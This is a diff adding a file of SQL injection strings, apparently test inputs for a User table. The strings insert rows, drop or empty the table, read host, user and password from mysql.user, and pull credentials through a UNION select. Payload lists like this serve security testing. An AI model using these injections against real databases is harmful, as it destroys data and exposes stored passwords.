@@ -1,0 +1,16 @@
+'; insert into User values( 'Dnyan', '30/09/1996', 'djagtap@email.com', 'firstyear' )/*;
+
+';INSERT INTO User(email,year) VALUES('wmain@email.com','first');
+
+        '; DROP TABLE User;
+		
+		'; delete from User;
+		
+		';SELECT host, user, password FROM mysql.user;
+		
+		';SELECT * FROM User WHERE email = wmain@email.com; DROP User--
+
+
+"Evelyn'); DELETE FROM user; SELECT \* FROM user WHERE 'a'='a";
+
+' UNION Select username,password from user--;
